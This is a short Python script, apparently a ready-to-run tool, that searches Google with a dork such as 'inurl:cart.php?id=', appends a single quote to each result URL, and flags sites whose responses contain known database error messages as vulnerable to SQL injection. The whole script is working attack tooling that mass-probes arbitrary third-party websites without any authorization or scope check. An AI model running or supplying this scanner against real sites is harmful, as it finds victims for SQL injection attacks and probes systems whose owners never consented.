#!/usr/bin/python3

import sys
import re

# the error contans for sql injection vulnerable
errors = {'MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'Server Error' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Not found' : 'Not found'}


try:
    import requests
    import googlesearch
    # the function to exploit the google hacking databases
    def Exploit(dork,total_page):
        # this require google search engine
        user_agent = {"User-agent":"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"}

        Total_page = int(total_page)

        for b in googlesearch.search(dork, num=Total_page):
            web = b+"'" # add ' to end the result url. to check if website is vuln by SQL Injection
            # using requests
            r = requests.get(web, headers=user_agent)
            webs = r.text
            # return errors dictionary to find the error problem matches
            for Type, ErrorMessage in errors.items():
                if re.search(ErrorMessage, webs):
                    # append the list of vulnerability website to result
                    print(" \033[41m\033[30mVULN\033[40m\033[37m {0}\n Vulnerability Type: \033[31m{1}".format(b,Type))

    # doing the while input
    while True:
        # going to ask your dork
        dork = input("[?] dork: [inurl:cart.php?id=]  ")
        total_page = input("[?] total page :  ")

        # if you input the empty dork. this will set the default dork as 'inurl:products.php?id='
        if not dork:
            Exploit(dork = "inurl:cart.php?id=",
                    total_page = total_page)
        else:
            Exploit(dork = dork,total_page = total_page)

except ImportError:
    # this error will display on your terminal if you havent
    # installed the google module
    print("[!] You havent installed the required modules!\n[+] to install that packages. run 'pip3 install -r requirements.txt' on your terminal\n")
    sys.exit()
except KeyboardInterrupt:
    sys.exit()
